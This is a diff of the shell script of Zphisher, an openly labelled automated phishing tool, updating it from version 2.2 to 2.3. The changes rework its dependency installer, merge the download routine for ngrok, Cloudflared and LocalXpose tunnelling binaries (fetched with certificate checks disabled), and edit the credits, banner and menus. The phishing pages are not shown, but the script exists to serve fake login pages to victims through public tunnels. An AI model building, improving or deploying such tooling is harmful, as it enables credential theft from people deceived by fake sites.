@@ -2,23 +2,8 @@
 
 ##   Zphisher 	: 	Automated Phishing Tool
 ##   Author 	: 	TAHMID RAYAT 
-##   Version 	: 	2.2
-##   Github 	: 	https://github.com/htr-tech
-
-##   THANKS TO :
-##   Aditya Shakya - https://github.com/adi1090x
-##   1RaY-1 - https://github.com/1RaY-1
-##   Ali Milani Amin - https://github.com/AliMilani
-##   Moises Tapia - https://github.com/MoisesTapia
-##   TheLinuxChoice - https://twitter.com/linux_choice
-##   DarksecDevelopers  - https://github.com/DarksecDevelopers
-##   Ignitetch  - https://github.com/Ignitetch/AdvPhishing
-##   Võ Ngọc Bảo - https://github.com/vongocbao
-##   Mustakim Ahmed - https://www.facebook.com/Learn.Termux.009
-
-
-## If you Copy Then Give the credits :)
-
+##   Version 	: 	2.3
+##   Github 	: 	https://github.com/htr-tech/zphisher
 
 
 ##                   GNU GENERAL PUBLIC LICENSE
@@ -94,6 +79,17 @@
 ##      Copyright (C) 2022  HTR-TECH (https://github.com/htr-tech)
 ##
 
+##   THANKS TO :
+##   1RaY-1 - https://github.com/1RaY-1
+##   Aditya Shakya - https://github.com/adi1090x
+##   Ali Milani Amin - https://github.com/AliMilani
+##   Ignitetch  - https://github.com/Ignitetch/AdvPhishing
+##   Moises Tapia - https://github.com/MoisesTapia
+##   Mustakim Ahmed - https://github.com/bdhackers009
+##   TheLinuxChoice - https://twitter.com/linux_choice
+
+
+__version__="2.3.0"
 
 ## ANSI colors (FG & BG)
 RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
@@ -117,11 +113,14 @@ if [[ -d ".server/www" ]]; then
 else
 	mkdir -p ".server/www"
 fi
-if [[ -e ".server/.cld.log" ]]; then
-	rm -rf ".server/.cld.log"
-fi
+
+## Remove logfile
 if [[ -e ".server/.loclx" ]]; then
 	rm -rf ".server/.loclx"
+fi
+
+if [[ -e ".server/.cld.log" ]]; then
+	rm -rf ".server/.cld.log"
 fi
 
 ## Script termination
@@ -147,18 +146,12 @@ reset_color() {
 
 ## Kill already running process
 kill_pid() {
-	if [[ `pidof php` ]]; then
-		killall php > /dev/null 2>&1
-	fi
-	if [[ `pidof ngrok` ]]; then
-		killall ngrok > /dev/null 2>&1
-	fi
-	if [[ `pidof cloudflared` ]]; then
-		killall cloudflared > /dev/null 2>&1
-	fi
-	if [[ `pidof loclx` ]]; then
-		killall loclx > /dev/null 2>&1
-	fi
+	check_PID="php ngrok cloudflared loclx"
+	for process in ${check_PID}; do
+		if [[ $(pidof ${process}) ]]; then # Check for Process
+			killall ${process} > /dev/null 2>&1 # Kill the Process
+		fi
+	done
 }
 
 ## Banner
@@ -172,7 +165,7 @@ banner() {
 		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
 		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
 		${ORANGE}      | |                                
-		${ORANGE}      |_|                ${RED}Version : 2.2
+		${ORANGE}      |_|                ${RED}Version : ${__version__}
 
 		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by htr-tech (tahmid.rayat)${WHITE}
 	EOF
@@ -184,7 +177,7 @@ banner_small() {
 		${BLUE}
 		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
 		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
-		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} 2.2
+		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} ${__version__}
 	EOF
 }
 
@@ -193,40 +186,35 @@ dependencies() {
 	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
 
     if [[ -d "/data/data/com.termux/files/home" ]]; then
-        if [[ `command -v proot` ]]; then
-            printf ''
-        else
+        if [[ ! $(command -v proot) ]]; then
 			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
             pkg install proot resolv-conf -y
         fi
 
-        if [[ `command -v tput` ]]; then
-            printf ''
-        else
+        if [[ ! $(command -v tput) ]]; then
 			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
             pkg install ncurses-utils -y
         fi
-
     fi
 
-	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
+	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
 	else
-		pkgs=(php curl wget unzip)
+		pkgs=(php curl unzip)
 		for pkg in "${pkgs[@]}"; do
 			type -p "$pkg" &>/dev/null || {
 				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
-				if [[ `command -v pkg` ]]; then
+				if [[ $(command -v pkg) ]]; then
 					pkg install "$pkg" -y
-				elif [[ `command -v apt` ]]; then
+				elif [[ $(command -v apt) ]]; then
 					sudo apt install "$pkg" -y
-				elif [[ `command -v apt-get` ]]; then
+				elif [[ $(command -v apt-get) ]]; then
 					sudo apt-get install "$pkg" -y
-				elif [[ `command -v pacman` ]]; then
+				elif [[ $(command -v pacman) ]]; then
 					sudo pacman -S "$pkg" --noconfirm
-				elif [[ `command -v dnf` ]]; then
+				elif [[ $(command -v dnf) ]]; then
 					sudo dnf -y install "$pkg"
-				elif [[ `command -v yum` ]]; then
+				elif [[ $(command -v yum) ]]; then
 					sudo yum -y install "$pkg"
 				else
 					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
@@ -235,60 +223,33 @@ dependencies() {
 			}
 		done
 	fi
-
 }
 
-## Download Ngrok
-download_ngrok() {
+# Download Binaries
+download() {
 	url="$1"
+	output="$2"
 	file=`basename $url`
-	if [[ -e "$file" ]]; then
-		rm -rf "$file"
+	if [[ -e "$file" || -e "$output" ]]; then
+		rm -rf "$file" "$output"
 	fi
-	wget --no-check-certificate "$url" > /dev/null 2>&1
-	if [[ -e "$file" ]]; then
-		unzip "$file" > /dev/null 2>&1
-		mv -f ngrok .server/ngrok > /dev/null 2>&1
-		rm -rf "$file" > /dev/null 2>&1
-		chmod +x .server/ngrok > /dev/null 2>&1
-	else
-		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Ngrok manually."
-		{ reset_color; exit 1; }
-	fi
-}
+	curl --silent --insecure --fail --retry-connrefused \
+		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"
 
-## Download Cloudflared
-download_cloudflared() {
-	url="$1"
-	file=`basename $url`
 	if [[ -e "$file" ]]; then
+		if [[ ${file#*.} == "zip" ]]; then
+			unzip -qq $file > /dev/null 2>&1
+			mv -f $output .server/$output > /dev/null 2>&1
+		elif [[ ${file#*.} == "tgz" ]]; then
+			tar -zxf $file > /dev/null 2>&1
+			mv -f $output .server/$output > /dev/null 2>&1
+		else
+			mv -f $file .server/$output > /dev/null 2>&1
+		fi
+		chmod +x .server/$output > /dev/null 2>&1
 		rm -rf "$file"
-	fi
-	wget --no-check-certificate "$url" > /dev/null 2>&1
-	if [[ -e "$file" ]]; then
-		mv -f "$file" .server/cloudflared > /dev/null 2>&1
-		chmod +x .server/cloudflared > /dev/null 2>&1
 	else
-		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Cloudflared manually."
-		{ reset_color; exit 1; }
-	fi
-}
-
-## Download LocalXpose
-download_localxpose() {
-	url="$1"
-	file=`basename $url`
-	if [[ -e "$file" ]]; then
-		rm -rf "$file"
-	fi
-	wget --no-check-certificate "$url" > /dev/null 2>&1
-	if [[ -e "$file" ]]; then
-		unzip "$file" > /dev/null 2>&1
-		mv -f loclx .server/loclx > /dev/null 2>&1
-		rm -rf "$file" > /dev/null 2>&1
-		chmod +x .server/loclx > /dev/null 2>&1
-	else
-		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install LocalXpose manually."
+		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
 		{ reset_color; exit 1; }
 	fi
 }
@@ -301,13 +262,13 @@ install_ngrok() {
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
+			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz' 'ngrok'
 		elif [[ "$arch" == *'aarch64'* ]]; then
-			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip'
+			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz' 'ngrok'
 		elif [[ "$arch" == *'x86_64'* ]]; then
-			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
+			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz' 'ngrok'
 		else
-			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
+			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.tgz' 'ngrok'
 		fi
 	fi
 }
@@ -320,13 +281,13 @@ install_cloudflared() {
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
 		elif [[ "$arch" == *'aarch64'* ]]; then
-			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64'
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
 		elif [[ "$arch" == *'x86_64'* ]]; then
-			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
 		else
-			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386'
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
 		fi
 	fi
 }
@@ -339,13 +300,13 @@ install_localxpose() {
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			download_localxpose 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip'
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
 		elif [[ "$arch" == *'aarch64'* ]]; then
-			download_localxpose 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip'
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
 		elif [[ "$arch" == *'x86_64'* ]]; then
-			download_localxpose 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip'
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
 		else
-			download_localxpose 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip'
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
 		fi
 	fi
 }
@@ -361,24 +322,25 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN}Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
-		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/htr-tech
-		${GREEN}Social   ${RED}:  ${CYAN}https://linktr.ee/tahmid.rayat
-		${GREEN}Version  ${RED}:  ${ORANGE}2.2
+		${GREEN} Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
+		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/htr-tech
+		${GREEN} Social   ${RED}:  ${CYAN}https://tahmidrayat.is-a.dev
+		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
 
-		${REDBG}${WHITE} Thanks : Adi1090x,MoisesTapia,ThelinuxChoice
-								  DarkSecDevelopers,Mustakim Ahmed,1RaY-1,AliMilani ${RESETBG}
-
-		${RED}Warning:${WHITE}
-		${CYAN}This Tool is made for educational purpose only ${RED}!${WHITE}
-		${CYAN}Author will not be responsible for any misuse of this toolkit ${RED}!${WHITE}
+		${WHITE} ${REDBG}Warning:${RESETBG}
+		${CYAN}  This Tool is made for educational purpose 
+		  only ${RED}!${WHITE}${CYAN} Author will not be responsible for 
+		  any misuse of this toolkit ${RED}!${WHITE}
+		
+		${WHITE} ${CYANBG}Special Thanks to:${RESETBG}
+		${GREEN}  1RaY-1, Adi1090x, AliMilani, BDhackers009,
+		  KasRoudra, sepp0, ThelinuxChoice, Yisus7u7
 
 		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
 
 	EOF
 
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
-
 	case $REPLY in 
 		99)
 			msg_exit;;
@@ -518,10 +480,10 @@ tunnel_menu() {
 	{ clear; banner_small; }
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Localhost    ${RED}[${CYAN}For Devs${RED}]
+		${RED}[${WHITE}01${RED}]${ORANGE} Localhost
 		${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io     ${RED}[${CYAN}Account Needed${RED}]
 		${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]
-		${RED}[${WHITE}04${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}NEW!${RED}]
+		${RED}[${WHITE}04${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}NEW! Max 15Min${RED}]
 
 	EOF
 
